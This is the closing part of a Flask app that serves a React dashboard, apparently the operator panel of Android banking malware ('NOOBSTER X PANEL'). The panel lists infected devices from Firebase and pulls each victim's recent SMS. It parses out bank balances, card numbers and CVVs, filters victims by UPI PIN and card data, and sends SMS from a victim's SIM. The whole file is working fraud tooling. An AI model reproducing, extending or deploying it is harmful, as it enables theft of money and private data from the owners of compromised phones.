                        e(InfoRow, { label: "Storage", value: dev.storage }),
                        e(InfoRow, { label: "CPU", value: dev.cpu, mono: true }),
                        e(InfoRow, { label: "SDK", value: dev.sdk }),
                        e(InfoRow, { label: "SIMs", value: dev.sims.length + " SIM(s)" }),
                        dev.sims.map((s, i) => s.phoneNumber && e(InfoRow, { key: i, label: "SIM " + (i+1), value: s.phoneNumber, mono: true }))
                    ),
                    tab === "bank" && e("div", { className: "px-4 py-3 space-y-2" },
                        loading ? e("div", { className: "py-12 text-center", style: { color: "#555" } }, e("div", { className: "w-6 h-6 border-2 mx-auto mb-3 animate-spin rounded-full", style: { borderColor: "#333", borderTopColor: "#10b981" } }), "Scanning SMS...")
                        : analysis.bankBalances.length === 0 ? e("div", { className: "py-12 text-center", style: { color: "#444" } }, e(Icon, { name: "rupee", size: 40, className: "mx-auto mb-3 opacity-30" }), "No bank SMS found")
                        : analysis.bankBalances.map((b, i) => e(BankCard, { key: i, balance: b }))
                    ),
                    tab === "card" && e("div", { className: "px-4 py-3 space-y-2" },
                        analysis.cards.length === 0 ? e("div", { className: "py-12 text-center", style: { color: "#444" } }, e(Icon, { name: "card", size: 40, className: "mx-auto mb-3 opacity-30" }), "No card found")
                        : analysis.cards.map((c, i) => e(CardDisplay, { key: i, card: c }))
                    ),
                    tab === "sms" && e("div", { className: "px-4 py-3 space-y-2" },
                        loading ? e("div", { className: "py-12 text-center", style: { color: "#555" } }, e("div", { className: "w-6 h-6 border-2 mx-auto mb-3 animate-spin rounded-full", style: { borderColor: "#333", borderTopColor: "#ef4444" } }), "Loading...")
                        : messages.length === 0 ? e("div", { className: "py-12 text-center", style: { color: "#444" } }, e(Icon, { name: "msg", size: 40, className: "mx-auto mb-3 opacity-30" }), "No messages")
                        : messages.map((m, i) => {
                            const isBank = /AVL|AVAL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text);
                            const isCard = /CARD|CVV/i.test(m.text);
                            return e("div", { key: i, className: "p-3 rounded-xl border-l-2", style: { background: isCard ? "#100d18" : isBank ? "#0a130d" : "#111", borderColor: "#1e1e1e", borderLeftColor: isCard ? "rgba(168,85,247,0.6)" : isBank ? "rgba(34,197,94,0.6)" : "rgba(239,68,68,0.6)" } },
                                e("div", { className: "flex items-center justify-between mb-2" },
                                    e("span", { className: "text-xs font-bold", style: { color: isCard ? "#c084fc" : isBank ? "#4ade80" : "#f87171" } }, m.sender),
                                    e("span", { className: "text-[10px] font-mono", style: { color: "#444" } }, m.time)
                                ),
                                e("p", { className: "text-xs leading-relaxed", style: { color: "#aaa" } }, m.text.substring(0, 250))
                            );
                        })
                    ),
                    tab === "send" && e("div", { className: "px-5 py-4 space-y-4" },
                        e("div", null,
                            e("p", { className: "text-[10px] font-semibold uppercase tracking-widest mb-2", style: { color: "#555" } }, "Select SIM"),
                            e("div", { className: "flex gap-2" }, [1, 2].map(n => e("button", { key: n, onClick: () => setSendSim(n), className: "flex-1 py-2.5 rounded-xl text-sm font-bold transition-all", style: { background: sendSim === n ? "#dc2626" : "#111", border: sendSim === n ? "none" : "1px solid #222", color: sendSim === n ? "#fff" : "#666" } }, "SIM " + n)))
                        ),
                        e("div", null,
                            e("p", { className: "text-[10px] font-semibold uppercase tracking-widest mb-2", style: { color: "#555" } }, "Recipient"),
                            e("input", { type: "text", value: sendTo, onChange: ev => setSendTo(ev.target.value), placeholder: "+919876543210", className: "w-full px-4 py-3 rounded-xl outline-none text-sm font-mono", style: { background: "#111", border: "1px solid #222", color: "#fff" } })
                        ),
                        e("div", null,
                            e("p", { className: "text-[10px] font-semibold uppercase tracking-widest mb-2", style: { color: "#555" } }, "Message"),
                            e("textarea", { value: sendMsg, onChange: ev => setSendMsg(ev.target.value), rows: 4, placeholder: "Type your message…", className: "w-full px-4 py-3 rounded-xl outline-none text-sm resize-none", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
                            e("p", { className: "text-[10px] text-right mt-1", style: { color: "#444" } }, sendMsg.length + " chars")
                        ),
                        e("button", { onClick: send, disabled: sending, className: "w-full py-3.5 rounded-xl font-bold text-sm text-white disabled:opacity-50", style: { background: "#dc2626" } },
                            sending ? "Sending…" : "Send via SIM " + sendSim)
                    )
                )
            )
        );
    }

    function InfoRow({ label, value, mono, highlight }) {
        return e("div", { className: "flex items-start justify-between py-2.5", style: { borderBottom: "1px solid #1a1a1a" } },
            e("span", { className: "text-xs font-medium", style: { color: "#555", width: "8rem", flexShrink: 0 } }, label),
            e("span", { className: "text-xs text-right break-all " + (mono ? "font-mono" : "font-semibold"), style: { color: highlight || "#ccc" } }, value || "—")
        );
    }

    function BankCard({ balance }) {
        const isCredit = balance.transactionType === "credit";
        return e("div", { className: "p-3 rounded-xl border-l-2", style: { background: "#0a1410", borderColor: "rgba(6,78,59,0.3)", borderLeftColor: "rgba(34,197,94,0.7)" } },
            e("div", { className: "flex items-center justify-between mb-2" },
                e("div", { className: "flex items-center gap-2" },
                    e("div", { className: "w-6 h-6 rounded-lg flex items-center justify-center", style: { background: "rgba(34,197,94,0.15)", border: "1px solid rgba(34,197,94,0.25)" } }, e(Icon, { name: "rupee", size: 12, className: "text-emerald-400" })),
                    e("span", { className: "text-xs font-bold text-emerald-400" }, balance.bankName),
                    balance.accountLast4 && e("span", { className: "text-[10px] font-mono px-1.5 rounded", style: { color: "#555", background: "#111" } }, "••" + balance.accountLast4)
                ),
                balance.transactionType && e("span", { className: "text-[10px] font-semibold px-2 py-0.5 rounded-full", style: { background: isCredit ? "rgba(34,197,94,0.1)" : "rgba(239,68,68,0.1)", color: isCredit ? "#4ade80" : "#f87171" } }, isCredit ? "Credit" : "Debit")
            ),
            e("div", { className: "flex items-end justify-between" },
                e("div", null,
                    e("p", { className: "text-[9px] uppercase tracking-widest mb-0.5", style: { color: "#555" } }, "Available Balance"),
                    e("p", { className: "text-xl font-black text-white" }, e("span", { className: "text-emerald-400 text-sm mr-0.5" }, "₹"), formatCurrency(balance.availableBalance))
                ),
                balance.transactionAmount && balance.transactionAmount !== balance.availableBalance && e("div", { className: "text-right" },
                    e("p", { className: "text-[9px] uppercase tracking-widest mb-0.5", style: { color: "#555" } }, "Txn"),
                    e("p", { className: "text-sm font-bold", style: { color: isCredit ? "#4ade80" : "#f87171" } }, (isCredit ? "+" : "-") + "₹" + formatCurrency(balance.transactionAmount))
                )
            ),
            balance.phoneFromSms && e("div", { className: "flex items-center gap-1 mt-2 pt-2", style: { borderTop: "1px solid rgba(6,78,59,0.3)" } },
                e(Icon, { name: "phone", size: 12, className: "text-blue-400" }),
                e("span", { className: "text-[10px] font-mono", style: { color: "#777" } }, balance.phoneFromSms)
            ),
            e("p", { className: "text-[10px] mt-2 line-clamp-2", style: { color: "#333" } }, balance.rawSms.substring(0, 130))
        );
    }

    function CardDisplay({ card }) {
        const [showCvv, setShowCvv] = useState(false);
        return e("div", { className: "p-3 rounded-xl border-l-2", style: { background: "#0f0a1a", borderColor: "rgba(88,28,135,0.3)", borderLeftColor: "rgba(168,85,247,0.7)" } },
            e("div", { className: "flex items-center justify-between mb-2" },
                e("div", { className: "flex items-center gap-2" },
                    e("div", { className: "w-6 h-6 rounded-lg flex items-center justify-center", style: { background: "rgba(168,85,247,0.15)", border: "1px solid rgba(168,85,247,0.25)" } }, e(Icon, { name: "card", size: 12, className: "text-purple-400" })),
                    e("span", { className: "text-xs font-bold text-purple-400" }, card.cardType || "Card")
                ),
                card.expiry && e("span", { className: "text-[10px] font-mono", style: { color: "#555" } }, "Exp: " + card.expiry)
            ),
            e("span", { className: "font-mono text-xs", style: { color: "#aaa" } }, "•••• •••• •••• " + card.cardLast4),
            card.cvv && e("div", { className: "flex items-center gap-2 mt-2" },
                e("span", { className: "text-[10px] uppercase tracking-widest", style: { color: "#555" } }, "CVV:"),
                e("span", { className: "text-xs font-mono text-purple-300" }, showCvv ? card.cvv : "•••"),
                e("button", { onClick: () => setShowCvv(!showCvv), className: "p-0.5", style: { color: "#444" } }, e(Icon, { name: showCvv ? "eyeoff" : "eye", size: 12 }))
            ),
            e("p", { className: "text-[10px] mt-2 line-clamp-2", style: { color: "#2a2a2a" } }, card.rawSms.substring(0, 130))
        );
    }

    function DeviceSkeleton() {
        return e("div", { className: "rounded-2xl p-4 animate-pulse", style: { background: "#111", border: "1px solid #1f1f1f" } },
            e("div", { className: "flex items-start gap-3 mb-3" },
                e("div", { className: "w-10 h-10 rounded-xl", style: { background: "#1a1a1a" } }),
                e("div", { className: "flex-1 space-y-2" },
                    e("div", { className: "h-3 rounded w-3/4", style: { background: "#1a1a1a" } }),
                    e("div", { className: "h-2 rounded w-1/2", style: { background: "#151515" } })
                )
            ),
            e("div", { className: "grid grid-cols-2 gap-3 mb-3" },
                e("div", { className: "h-8 rounded-xl", style: { background: "#151515" } }),
                e("div", { className: "h-8 rounded-xl", style: { background: "#151515" } })
            )
        );
    }

    function Panel({ fbUrl, fbKey, accounts, onLogout }) {
        const accs = accounts && accounts.length > 0 ? accounts : [{ url: fbUrl, key: fbKey }];
        const [starred, setStarred] = useState(() => LS.get(STARRED_KEY, []));
        const [devices, setDevices] = useState([]);
        const [loading, setLoading] = useState(true);
        const [selected, setSelected] = useState(null);
        const [filter, setFilter] = useState("all");
        const [sortBy, setSortBy] = useState("new");
        const [search, setSearch] = useState("");
        const [toast, setToast] = useState(null);
        const [err, setErr] = useState("");
        const [now, setNow] = useState(new Date());
        const prevCount = useRef(0);
        const loadedRef = useRef(false);

        const showToast = useCallback((msg, type = "info") => {
            setToast({ msg, type, id: Date.now() });
        }, []);

        const toggleStar = (id) => {
            const next = starred.includes(id) ? starred.filter(x => x !== id) : [...starred, id];
            setStarred(next); LS.set(STARRED_KEY, next);
        };

        const loadDevices = useCallback(async (silent) => {
            try {
                let all = [];
                let errs = [];
                await Promise.all(accs.map(async (acc) => {
                    try {
                        const data = await fbFetch(acc.url, acc.key, "clients");
                        const list = parseDevices(data);
                        list.forEach(d => { d._accountUrl = acc.url; d._accountKey = acc.key; });
                        all.push(...list);
                    } catch (e) { errs.push(e); }
                }));
                if (all.length === 0 && errs.length > 0) throw errs[0];
                setDevices(all);
                setErr("");
                setLoading(false);
                // SMS analyze each new device
                const newDevs = all.filter(d => !loadedRef.current || true);
                const chunk = [];
                for (let i = 0; i < all.length; i += 5) {
                    chunk.push(all.slice(i, i + 5));
                }
                for (const grp of chunk) {
                    await Promise.all(grp.map(async (dev) => {
                        try {
                            const data = await fbFetch(dev._accountUrl, dev._accountKey, "messages/" + dev.id, { orderBy: '"$key"', limitToLast: "150" });
                            const parsed = parseMessages(data);
                            const analysis = analyzeSMS(parsed);
                            setDevices(prev => prev.map(p => p.id === dev.id ? { ...p, smsAnalysis: analysis } : p));
                        } catch {}
                    }));
                }
                if (prevCount.current > 0 && all.length > prevCount.current && silent) showToast("🔔 New device connected!");
                prevCount.current = all.length;
                loadedRef.current = true;
            } catch (e) {
                setLoading(false);
                const msg = e.message || "";
                if (msg.includes("PERMISSION")) setErr("Firebase Permission Denied — Use Database Secret key.");
                else if (msg.includes("404")) setErr("Database path not found.");
                else setErr(msg.slice(0, 120));
            }
        }, [accs, showToast]);

        useEffect(() => {
            loadDevices(false);
            const iv1 = setInterval(() => loadDevices(true), 15000);
            const iv2 = setInterval(() => setNow(new Date()), 1000);
            return () => { clearInterval(iv1); clearInterval(iv2); };
        }, [loadDevices]);

        const filtered = useMemo(() => {
            return devices.filter(d => {
                if (filter === "online" && !d.status) return false;
                if (filter === "offline" && d.status) return false;
                if (filter === "starred" && !starred.includes(d.id)) return false;
                if (filter === "upi" && !d.upipin) return false;
                if (filter === "bank" && !(d.smsAnalysis && d.smsAnalysis.bankBalances.length)) return false;
                if (filter === "card" && !(d.smsAnalysis && d.smsAnalysis.cards.length)) return false;
                const q = search.toLowerCase();
                if (q && !d.name.toLowerCase().includes(q) && !d.phoneNumber.includes(q) && !d.id.includes(q)) return false;
                return true;
            }).sort((a, b) => {
                if (sortBy === "name") return a.name.localeCompare(b.name);
                if (sortBy === "battery") return b.batteryPercent - a.batteryPercent;
                if (sortBy === "old") return String(a.id).localeCompare(String(b.id));
                return String(b.id).localeCompare(String(a.id));
            });
        }, [devices, filter, starred, search, sortBy]);

        const onlineCount = devices.filter(d => d.status).length;
        const offlineCount = devices.length - onlineCount;
        const starredCount = devices.filter(d => starred.includes(d.id)).length;
        const bankCount = devices.filter(d => d.smsAnalysis && d.smsAnalysis.bankBalances.length).length;
        const cardCount = devices.filter(d => d.smsAnalysis && d.smsAnalysis.cards.length).length;
        const timeStr = now.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: false });

        return e("div", { className: "min-h-screen flex flex-col relative", style: { background: "#080808", color: "#fff" } },
            e("header", { className: "sticky top-0 z-40 backdrop-blur-md", style: { background: "rgba(10,10,10,0.8)", borderBottom: "1px solid rgba(26,26,26,0.8)" } },
                e("div", { className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-4 flex-wrap" },
                    e("div", { className: "flex items-center gap-2.5 flex-shrink-0" },
                        e("div", { className: "w-7 h-7 rounded-lg red-gradient flex items-center justify-center" }, e("img", { src: "https://i.ibb.co/TMbrv7yV/noobster.jpg", style: { width: "100%", height: "100%", objectFit: "cover", borderRadius: "inherit" } })),
                        e("span", { style: { color: "#6acfff" } }, "NOOBSTER"),
                        e("span", null, " 𝑿 "),
                        e("span", { className: "relative" }, "𝑷𝑨𝑵𝑬𝑳", e("span", { className: "absolute -top-1 -right-1 w-1.5 h-1.5 rounded-full animate-glint", style: { background: "#6acfff" } }))
                    ),
                    e("div", { className: "relative flex-1 max-w-sm", style: { minWidth: "200px" } },
                        e("input", { type: "text", value: search, onChange: ev => setSearch(ev.target.value), placeholder: "Search devices...", className: "w-full pl-9 pr-4 py-2 rounded-xl outline-none text-sm", style: { background: "#111", border: "1px solid #222", color: "#fff" } }),
                        e("div", { className: "absolute left-3 top-1/2 -translate-y-1/2", style: { color: "#444" } }, e(Icon, { name: "search", size: 16 }))
                    ),
                    e("div", { className: "ml-auto flex items-center gap-3 flex-wrap" },
                        e("div", { className: "flex items-center gap-2 px-3 py-1.5 rounded-full", style: { background: "rgba(2,44,34,0.4)", border: "1px solid rgba(6,78,59,0.4)" } },
                            e("span", { className: "w-2 h-2 rounded-full bg-emerald-500 animate-pulse" }),
                            e("span", { className: "text-xs font-semibold text-emerald-400" }, onlineCount + " online")
                        ),
                        e("a", { href: "https://t.me/noobsterrr", target: "_blank", rel: "noopener", className: "inline-block" },
                            e("svg", { xmlns: "http://www.w3.org/2000/svg", viewBox: "0 0 240 240", fill: "#0088cc", className: "w-8 h-8", children: e("path", { d: "M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-0.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z" }) })
                        ),
                        e("div", { className: "flex items-center gap-1.5 px-3 py-1.5 rounded-full", style: { background: "#111", border: "1px solid #1e1e1e" } },
                            e(Icon, { name: "clock", size: 14, className: "text-[#555]" }),
                            e("span", { className: "text-xs font-mono font-bold", style: { color: "#888" } }, timeStr)
                        ),
                        e("button", { onClick: () => confirm("Logout?") && onLogout(), className: "flex items-center gap-2 px-3 py-1.5 rounded-xl text-xs", style: { background: "#111", border: "1px solid #222", color: "#666" } },
                            e(Icon, { name: "logout", size: 14 }), "Logout")
                    )
                )
            ),
            err && e("div", { className: "px-6 py-3 flex items-start gap-3", style: { background: "rgba(69,10,10,0.4)", borderBottom: "1px solid rgba(127,29,29,0.3)" } },
                e(Icon, { name: "alert", size: 16, className: "text-red-400 flex-shrink-0 mt-0.5" }),
                e("p", { className: "text-xs text-red-300 flex-1" }, err),
                e("button", { onClick: () => setErr(""), style: { color: "#f87171" } }, e(Icon, { name: "x", size: 14 }))
            ),
            e("div", { style: { background: "rgba(10,10,10,0.7)", borderBottom: "1px solid rgba(26,26,26,0.8)" } },
                e("div", { className: "max-w-screen-2xl mx-auto px-6 py-3 flex items-center gap-6 flex-wrap" },
                    e("div", { className: "flex items-center gap-5 flex-wrap" },
                        statBox("Total", devices.length, "#fff"),
                        statBox("Online", onlineCount, "#4ade80"),
                        statBox("Offline", offlineCount, "#666"),
                        statBox("Starred ⭐", starredCount, "#fbbf24"),
                        statBox("Bank SMS", bankCount, "#4ade80"),
                        cardCount > 0 && statBox("Cards", cardCount, "#c084fc")
                    ),
                    e("div", { className: "ml-auto flex items-center gap-2 flex-wrap" },
                        ["all", "online", "offline", "starred", "upi", "bank", "card"].map(f => e("button", { key: f, onClick: () => setFilter(f), className: "px-3 py-1.5 rounded-lg text-xs font-semibold capitalize", style: { background: filter === f ? "rgba(220,38,38,0.2)" : "transparent", color: filter === f ? "#f87171" : "#555", border: filter === f ? "1px solid rgba(220,38,38,0.3)" : "none" } }, f === "starred" ? "⭐ Starred" : f)),
                        e("div", { className: "w-px h-4", style: { background: "#222" } }),
                        e("select", { value: sortBy, onChange: ev => setSortBy(ev.target.value), className: "text-xs rounded-lg px-2 py-1.5 outline-none", style: { background: "#111", border: "1px solid #222", color: "#666" } },
                            e("option", { value: "new" }, "Newest"),
                            e("option", { value: "old" }, "Oldest"),
                            e("option", { value: "name" }, "Name"),
                            e("option", { value: "battery" }, "Battery")
                        ),
                        e("button", { onClick: () => loadDevices(false), className: "p-2 rounded-lg", style: { background: "#111", border: "1px solid #222", color: "#555" } }, e(Icon, { name: "refresh", size: 14 }))
                    )
                )
            ),
            e("main", { className: "flex-1 max-w-screen-2xl mx-auto w-full px-3 sm:px-6 py-4 sm:py-6" },
                loading ? e("div", null,
                    e("div", { className: "flex items-center gap-3 mb-5" },
                        e("div", { className: "w-4 h-4 border-2 animate-spin rounded-full", style: { borderColor: "#333", borderTopColor: "#ef4444" } }),
                        e("span", { className: "text-sm", style: { color: "#555" } }, "Connecting to Firebase…")
                    ),
                    e("div", { className: "grid grid-cols-1 sm:grid-cols-2 gap-3" }, Array.from({ length: 6 }).map((_, i) => e(DeviceSkeleton, { key: i })))
                ) : devices.length === 0 ? e("div", { className: "flex flex-col items-center justify-center py-24 text-center" },
                    e("div", { className: "w-16 h-16 rounded-2xl flex items-center justify-center mb-5", style: { background: "#111", border: "1px solid #1e1e1e" } }, e(Icon, { name: "shield", size: 48, className: "text-[#2a2a2a]" })),
                    e("p", { className: "text-base font-bold", style: { color: "#444" } }, "No devices connected"),
                    e("p", { className: "text-sm mt-1.5 mb-5", style: { color: "#333" } }, "Waiting for devices to register…")
                ) : e("div", { className: "grid grid-cols-1 sm:grid-cols-2 gap-3" },
                    filtered.map(d => e(DeviceCard, { key: d.id, dev: d, starred: starred.includes(d.id), onToggleStar: toggleStar, onClick: () => setSelected(d) })),
                    filtered.length === 0 && e("div", { className: "col-span-full py-16 text-center", style: { color: "#444" } }, e("p", { className: "text-sm" }, "No devices match your filter"))
                )
            ),
            toast && e(Toast, { msg: toast.msg, type: toast.type, onClose: () => setToast(null) }),
            selected && e(DeviceDetail, { dev: selected, fbUrl: selected._accountUrl || fbUrl, fbKey: selected._accountKey || fbKey, onClose: () => setSelected(null), onDelete: () => { setSelected(null); loadDevices(false); }, showToast })
        );

        function statBox(label, val, color) {
            return e("div", null,
                e("p", { className: "text-[9px] uppercase tracking-widest font-semibold", style: { color: "#444" } }, label),
                e("p", { className: "text-lg font-black", style: { color } }, val)
            );
        }
    }

    function App() {
        const [session, setSession] = useState(null);
        const connect = (url, key) => setSession({ url, key });
        const connectAll = (accs) => {
            if (!accs || accs.length === 0) return;
            setSession({ url: accs[0].url, key: accs[0].key, accounts: accs });
        };
        const logout = () => setSession(null);
        return session
            ? e(Panel, { fbUrl: session.url, fbKey: session.key, accounts: session.accounts, onLogout: logout })
            : e(LoginScreen, { onConnect: connect, onConnectAll: connectAll });
    }

    ReactDOM.createRoot(document.getElementById("root")).render(e(App));
    </script>
</body>

</html>"""

# ============================================================
# ROUTES
# ============================================================
@app.route("/")
@app.route("/admin")
def index():
    return Response(PAGE_HTML, mimetype="text/html")

@app.route("/healthz")
def health():
    return {"status": "ok"}

@app.route("/<path:path>")
def catch_all(path):
    return Response(PAGE_HTML, mimetype="text/html")

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
